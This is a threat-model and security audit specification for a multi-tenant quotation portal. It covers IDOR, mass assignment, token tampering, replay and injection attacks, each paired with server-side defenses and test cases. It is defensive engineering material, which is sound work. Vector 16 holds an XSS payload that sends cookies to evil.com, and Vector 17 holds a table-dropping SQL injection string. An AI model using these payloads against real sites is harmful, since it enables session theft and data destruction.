# DealFlow360 Customer Portal — Comprehensive Security Audit & Threat Defense Specification

**Document Version:** 1.0.0  
**Classification:** Defensive Security Engineering & Threat Modeling  
**Target Platform:** DealFlow360 Customer Portal & Backend API Gateway  
**Standard:** OWASP Top 10:2021 & OWASP API Security Top 10:2023 Compliant  

---

## 1. Adversary Model & Threat Profile

In this security audit, the customer is assumed to be **adversarial and highly motivated**:
- **Legitimate Credentials**: The attacker possesses valid customer authentication for Tenant A (e.g. *Sarah Connor*, `commercial_partner_id: 1205`, *Cyberdyne Defense Systems*).
- **Full API Visibility & Tooling**: The attacker does not rely on the browser UI. They utilize tools like `curl`, Postman, Burp Suite, and Python scripts to intercept, craft, replay, and tamper with HTTP requests.
- **Attack Objectives**:
  1. **Horizontal Privilege Escalation (Anti-IDOR)**: Access, read, download, or e-sign quotations belonging to Tenant B (*Wayne Enterprises*, `commercial_partner_id: 7701`).
  2. **Commercial Espionage**: Extract internal confidential data (cost prices, supplier names, profit margins, sales commission, risk ratings, internal deal desk comments).
  3. **Financial Fraud & Tampering**: Force an unapproved 25% discount, accept unapproved revisions, manipulate line prices, or trigger duplicate sales orders.
  4. **Vertical Privilege Escalation**: Bypass customer boundaries to invoke employee-only deal approval or ERP administrative endpoints.
  5. **Client-Side Injection**: Inject persistent XSS into negotiation comments to target sales reps or executives opening CRM views.

---

## 2. The 18 Attack Scenarios, Defenses & Test Matrix

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                               ATTACK VECTOR TAXONOMY                             │
├──────────────────────────────────────┬───────────────────────────────────────────┤
│ 1. IDOR & Access Control             │ Vectors 1, 2, 3, 4, 8, 18                 │
│ 2. Data Leakage & Confidentiality    │ Vectors 9, 10, 11                         │
│ 3. Financial & Parameter Tampering   │ Vectors 5, 6, 7, 12                       │
│ 4. Replay & Concurrency Attacks      │ Vector 13                                 │
│ 5. Session & Token Integrity         │ Vectors 14, 15                            │
│ 6. Injection & Cross-Site Scripting  │ Vectors 16, 17                            │
└──────────────────────────────────────┴───────────────────────────────────────────┘
```

---

### Vector 1: Changing Quote IDs (Horizontal IDOR on Read/PDF)
* **Attack Scenario**: Attacker modifies the URL from `/quotes/quo_8819ab2` (Tenant A) to `/quotes/quo_wayne_991` (Tenant B) or iterates numeric quote IDs (`/quotes/1`, `/quotes/2`).
* **Vulnerability Mechanism**: Relying on simple database lookups by ID without filtering by the authenticated user's tenant boundary.
* **Backend Authorization Requirement**:
  ```python
  # Every quote query MUST enforce dual-predicate ownership:
  quote = env['sale.order'].sudo().search([
      ('id', '=', quote_id),
      ('partner_id.commercial_partner_id', '=', current_user.commercial_partner_id.id)
  ], limit=1)
  if not quote:
      # 404-Masking Defense: Never return 403 Forbidden!
      raise NotFound("Quote not found.")
  ```
* **Frontend Security Requirement**: Route guard must catch 404 and render generic `ErrorView` without hinting that the ID exists under another account.
* **Expected Secure Response**: HTTP `404 Not Found` with RFC 7807 code `QUOTE_NOT_FOUND`.
* **Automated Test Case**: `test_anti_idor_cross_tenant_quote_access` in `test_portal_security_auth.py`.

---

### Vector 2: Changing Customer IDs (Identity Forgery & Parameter Pollution)
* **Attack Scenario**: Attacker injects `"partner_id": 9901` or `"commercial_partner_id": 7701` into request payloads or query parameters.
* **Vulnerability Mechanism**: Backend trusting user-supplied tenant/customer IDs in request bodies instead of extracting identity from verified cryptographic claims.
* **Backend Authorization Requirement**:
  - The backend **must ignore all user-supplied customer IDs** in request payloads.
  - User identity, `partner_id`, and `commercial_partner_id` must be extracted exclusively from the cryptographically validated JWT signature (`sub`, `commercial_partner_id`).
* **Expected Secure Response**: Customer IDs in body are completely discarded; operation is bound strictly to the token's authenticated partner.

---

### Vector 3: Accessing Another Customer's Quote (PDF & Attachments IDOR)
* **Attack Scenario**: Attacker requests `GET /api/v1/portal/quotes/quo_wayne_991/pdf` or `GET /attachments/att_wayne_99`.
* **Vulnerability Mechanism**: Serving static files directly from disk paths or CDN URLs without object-level permission verification.
* **Backend Authorization Requirement**:
  - Binary endpoints must verify quote ownership before streaming binary buffers.
  - Temporary download URLs must be pre-signed with short-lived (60s) HMAC tokens bound to `commercial_partner_id` and IP address.
* **Expected Secure Response**: HTTP `404 Not Found`.
* **Automated Test Case**: `test_anti_idor_pdf_download` in `test_portal_security_auth.py`.

---

### Vector 4: Calling APIs Directly (Bypassing UI Protections)
* **Attack Scenario**: Attacker observes that a UI button ("Confirm Quotation") is hidden or disabled, and sends `POST /api/v1/portal/quotes/{id}/accept` directly via `curl`.
* **Vulnerability Mechanism**: "Security through obscurity" — relying on `disabled="disabled"` or `v-if="canAccept"` in frontend HTML.
* **Backend Authorization Requirement**:
  - Controllers must enforce full state machine precondition checks independent of client state:
    ```python
    if quote.state != 'sent':
        raise Conflict("Quote is not in confirmable state.")
    if quote.negotiation_status not in ('none', 'approved_by_seller'):
        raise Conflict("Quote has an active negotiation lock.")
    ```
* **Expected Secure Response**: HTTP `409 Conflict` or `403 Forbidden`.

---

### Vector 5: Manipulating Request Bodies (Mass Assignment / Over-Posting)
* **Attack Scenario**: In `POST /quotes/{id}/accept` or `POST .../counter-discount`, the attacker includes unexpected fields:
  ```json
  {
    "status": "approved",
    "total_amount": 10.00,
    "line_items": [{"unit_price": 1.00}],
    "is_approved": true
  }
  ```
* **Vulnerability Mechanism**: Passing `request.json` directly into ORM `write()` or `create()` methods without schema whitelisting.
* **Backend Authorization Requirement**:
  - Strict input DTO whitelisting: Only explicit fields (`requested_discount_percent`, `rationale`, `signer_name`, `accepted_terms`) are parsed. All other keys are discarded or trigger a validation error.
  - Calculations (`total_amount`, `tax_total`, `line_subtotal`) are computed **exclusively by server-side business logic**.
* **Expected Secure Response**: HTTP `400 Bad Request` if schema invalid, or extraneous fields completely ignored.

---

### Vector 6: Changing Discount Values (Arbitrary Discount Injection)
* **Attack Scenario**: Attacker posts `requested_discount_percent: 50.0` or directly submits price override payloads.
* **Vulnerability Mechanism**: Client determining discount eligibility or applying discounts directly to order lines.
* **Backend Authorization Requirement**:
  - Customer input is treated strictly as a **proposal** (`counter_discount_proposal`), never as an active quotation attribute.
  - Server validates boundary ranges ($0.1\% \le \text{discount} \le 99.9\%$).
  - Backend Discount Governance Engine evaluates proposed discount against blended risk formulas and routes to approval tiers.
* **Expected Secure Response**: HTTP `201 Created` with `status: 'in_negotiation'` and `negotiation_status: 'pending_seller_review'`, or `400 Bad Request` if outside range.
* **Automated Test Case**: `test_14_negotiation_service_counter_discount` in `test_portal_integration_layer.py`.

---

### Vector 7: Confirming an Unapproved Quote (Premature E-Sign)
* **Attack Scenario**: Attacker calls `POST /quotes/{id}/accept` on a quote with `status: "in_negotiation"` or `status: "draft"`.
* **Vulnerability Mechanism**: Acceptance endpoint assuming any quote ID passed in is ready for signature.
* **Backend Authorization Requirement**:
  ```python
  if quote.status != 'sent':
      return send_rfc7807_error(409, "INVALID_STATUS_FOR_CONFIRMATION",
          "Quotation cannot be confirmed in its current status.")
  if quote.negotiation_status in ('pending_seller_review', 'in_review'):
      return send_rfc7807_error(409, "QUOTE_IN_NEGOTIATION_LOCKED",
          "Quotation is currently undergoing commercial review.")
  ```
* **Expected Secure Response**: HTTP `409 Conflict`.

---

### Vector 8: Confirming Another Customer's Quote (Unauthorized E-Sign)
* **Attack Scenario**: Attacker attempts to accept Tenant B's quote by calling `POST /api/v1/portal/quotes/quo_wayne_991/accept`.
* **Vulnerability Mechanism**: Missing tenant ownership verification on the state transition endpoint.
* **Backend Authorization Requirement**:
  - Dual-predicate check (`id == quote_id` AND `commercial_partner_id == current_user.commercial_partner_id`).
  - Signatory authorization check (`current_user.can_sign_quotes == True`).
* **Expected Secure Response**: HTTP `404 Not Found` (anti-enumeration).
* **Automated Test Case**: `test_anti_idor_quote_acceptance` in `test_portal_security_auth.py`.

---

### Vector 9: Accessing Internal Approval Data
* **Attack Scenario**: Attacker inspects JSON responses to discover internal approval routes, risk scores, or approver identity.
* **Vulnerability Mechanism**: Returning raw ORM model dumps containing internal fields (`approval_tier_id`, `risk_score`, `minimum_margin_required`).
* **Backend Authorization Requirement**:
  - Response normalizer transforms internal states into sanitized public view models:
    - Internal: `{ "stage": "vp_sales_review", "risk_score": 58.4, "floor_margin": 32.0 }`
    - Public Sanitized: `{ "public_stage_name": "Commercial Management Review", "stage_number": 1, "total_stages": 2 }`
* **Expected Secure Response**: Only sanitized public stages exposed; internal risk scores omitted.

---

### Vector 10: Accessing Internal Margin & Cost Prices
* **Attack Scenario**: Attacker inspects line item objects for `standard_price`, `cost_price`, `margin`, or `margin_percent`.
* **Vulnerability Mechanism**: Blacklisting fields rather than whitelisting, allowing newly added database fields to leak.
* **Backend Authorization Requirement**:
  - Strict serialization whitelist: Only `line_id`, `product_id`, `name`, `description`, `quantity`, `uom`, `unit_price`, `discount_percent`, `discount_amount`, `tax_rate_percent`, `tax_amount`, and `total_amount` are returned.
  - Fields prefixed with `_internal_` or containing `cost`, `margin`, `standard_price` are scrubbed before JSON encoding.
* **Expected Secure Response**: Cost and margin fields are completely absent from all JSON responses.
* **Automated Test Case**: `test_zero_leak_margin_cost_redaction` in `test_portal_security_auth.py`.

---

### Vector 11: Accessing Internal Comments (Privileged Chatter Leaks)
* **Attack Scenario**: Attacker requests `GET /quotes/{id}/lines/{line_id}/comments` and inspects responses for employee-only deal desk notes.
* **Vulnerability Mechanism**: Filtering comments in frontend JavaScript rather than in the backend SQL query.
* **Backend Authorization Requirement**:
  ```python
  # Database query MUST enforce visibility air-gap at the SQL layer:
  comments = env['dealflow.quote.comment'].search([
      ('quote_id', '=', quote.id),
      ('line_id', '=', line_id),
      ('visibility', '=', 'customer')  # NEVER expose visibility == 'internal'
  ])
  ```
* **Expected Secure Response**: Customer receives only customer-visible comments; internal comments are omitted.
* **Automated Test Case**: `test_02_zero_leak_boundary_internal_comments_redaction` in `test_portal_line_comments.py`.

---

### Vector 12: Modifying Quote Status from Frontend
* **Attack Scenario**: Attacker sends `PATCH /quotes/{id}` with `{"status": "approved"}` or `PUT /quotes/{id}` with state overrides.
* **Vulnerability Mechanism**: Exposing generic RESTful CRUD endpoints on complex state machines.
* **Backend Authorization Requirement**:
  - **Zero generic status mutation endpoints**: Status transitions are permissible **only** via dedicated, state-machine validated RPC endpoints (`/accept`, `/reject`, `/negotiation/counter-discount`).
  - Generic `PUT` or `PATCH` on quotation resources is rejected or ignores `status` fields.
* **Expected Secure Response**: HTTP `404 Not Found` or `405 Method Not Allowed`.

---

### Vector 13: Replaying Confirmation Requests (Duplicate Order Injection)
* **Attack Scenario**: Attacker clicks confirm multiple times or replays an accepted `POST /accept` request.
* **Vulnerability Mechanism**: Lack of idempotency handling leading to duplicate Sales Orders and double-billing.
* **Backend Authorization Requirement**:
  - Frontend generates a unique UUID v4 `Idempotency-Key` header.
  - Backend acquires an exclusive database row lock (`SELECT ... FOR UPDATE`).
  - If quote is already approved, backend returns the existing confirmation receipt without creating duplicate orders.
* **Expected Secure Response**: HTTP `200 OK` returning existing `reference_order_number`.

---

### Vector 14: Expired Sessions & Stale Tokens
* **Attack Scenario**: Attacker uses an expired JWT token (after 60-minute lifespan).
* **Vulnerability Mechanism**: Skipping JWT timestamp checks or failing to validate `exp` claim.
* **Backend Authorization Requirement**:
  - JWT verification library rejects expired signatures (`jwt.ExpiredSignatureError`).
* **Expected Secure Response**: HTTP `401 Unauthorized` with RFC 7807 code `SESSION_EXPIRED`.
* **Automated Test Case**: `test_magic_link_expiration` in `test_portal_security_auth.py`.

---

### Vector 15: Invalid & Tampered Tokens (Signature Forgery & Alg=None)
* **Attack Scenario**: Attacker alters the token payload (`"can_sign_quotes": true`, `"commercial_partner_id": 7701`) without a valid signature, or sets `"alg": "none"`.
* **Vulnerability Mechanism**: Insecure JWT decoding without enforcing HMAC signature algorithms.
* **Backend Authorization Requirement**:
  - Token decoding specifies `algorithms=['HS256']` with a high-entropy secret key.
  - Unsigned tokens or invalid signatures are rejected immediately.
* **Expected Secure Response**: HTTP `401 Unauthorized` with RFC 7807 code `UNAUTHORIZED`.
* **Automated Test Case**: `test_token_tampering_rejection` in `test_portal_security_auth.py`.

---

### Vector 16: Stored Cross-Site Scripting (XSS) via Comments
* **Attack Scenario**: Attacker posts a comment containing malicious script tags or event handlers:
  ```html
  <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  <img src=x onerror=alert(1)>
  ```
* **Vulnerability Mechanism**: Rendering comment messages directly into the DOM using `innerHTML` without sanitization.
* **Backend Authorization Requirement**:
  - Input stripping: Message text is sanitized and stripped of HTML/script tags before database persistence.
* **Frontend Security Requirement**:
  - **Never use `innerHTML` for user content**. Use `element.textContent` or `DOMPurify.sanitize()`.
* **Expected Secure Response**: Message stored as sanitized plain text; rendered inertly on client.

---

### Vector 17: Injection Through Negotiation Messages (SQLi & SSTI)
* **Attack Scenario**: Attacker submits SQL injection strings in the change request or counter-discount rationale:
  ```sql
  ' OR 1=1; DROP TABLE dealflow_quote; --
  ```
* **Vulnerability Mechanism**: Concatenating string inputs directly into SQL queries.
* **Backend Authorization Requirement**:
  - All database queries must use Odoo ORM parameterized domain expressions (`[('quote_id', '=', quote_id)]`).
  - Zero raw SQL execution with string interpolation (`f"SELECT * WHERE id = '{quote_id}'"` is strictly forbidden).
* **Expected Secure Response**: String stored verbatim as plain text; zero SQL alteration.

---

### Vector 18: Unauthorized API Calls & Internal Employee Bypass
* **Attack Scenario**: Internal sales employee (`base.group_user`, `share=False`) tries to log into the customer portal to view customer views, or customer attempts to call internal ERP endpoints.
* **Vulnerability Mechanism**: Sharing authentication middleware between external portal users and internal ERP users.
* **Backend Authorization Requirement**:
  - Portal authentication controller asserts `user.share == True`.
  - Internal employees are blocked with HTTP `403 Forbidden` (`EMPLOYEE_PORTAL_BYPASS`).
* **Expected Secure Response**: HTTP `403 Forbidden`.
* **Automated Test Case**: `test_employee_portal_bypass_blocked` in `test_portal_security_auth.py`.

---

## 3. Comprehensive Security Checklist

### A. Authentication & Session Integrity
- [x] Stateless dual-token JWT architecture (15-min access token, 7-day refresh token).
- [x] JWT algorithm locked to `HS256` with high-entropy environment secret (reject `alg=none`).
- [x] Expiration (`exp`) and not-before (`nbf`) claims strictly verified.
- [x] Internal employee portal bypass guard (`share == True` required).
- [x] Magic link tokens are cryptographically signed, single-use, and time-bounded (7 days).

### B. Authorization & Anti-IDOR Defense
- [x] Multi-tenant commercial partner boundary (`commercial_partner_id`) enforced on **100% of data-access queries**.
- [x] **404-Masking Defense**: Unauthorized cross-tenant access returns `404 Not Found`, never `403 Forbidden`.
- [x] Signatory privileges (`can_sign_quotes == True`) enforced server-side before contract acceptance.
- [x] Single-use ephemeral stream tickets for real-time SSE subscriptions.

### C. Data Confidentiality & Zero-Leak Scrubbing
- [x] Whitelist-only serialization pipeline permanently expunging internal cost prices, profit margins, and sales commissions.
- [x] Visibility air-gap: Deliverable comments with `visibility == 'internal'` are excluded at the SQL database layer.
- [x] Public negotiation stages sanitized (internal risk scores, approver IDs, and approval tiers omitted).

### D. Business Logic & State Integrity
- [x] Server-side price and discount recalculation (client-supplied totals are discarded).
- [x] Discount Governance and Blended Risk Engine remain authoritative on backend.
- [x] State transition precondition guards: Acceptance requires `status == 'sent'` and `negotiation_status == 'none'`.
- [x] UUID v4 `Idempotency-Key` header with database row locks (`SELECT ... FOR UPDATE`) preventing duplicate orders.
- [x] Superseded revision acceptance locked with HTTP `409 Conflict`.

### E. Input Validation & Injection Defense
- [x] Zero raw SQL string interpolation (100% parameterized Odoo ORM domains).
- [x] Safe DOM rendering: `textContent` or `DOMPurify` used across all comment bubbles and note views.
- [x] Numerical range validation ($0.1\% \le \text{discount} \le 99.9\%$).
- [x] Empty comment and whitespace-only submission rejection.
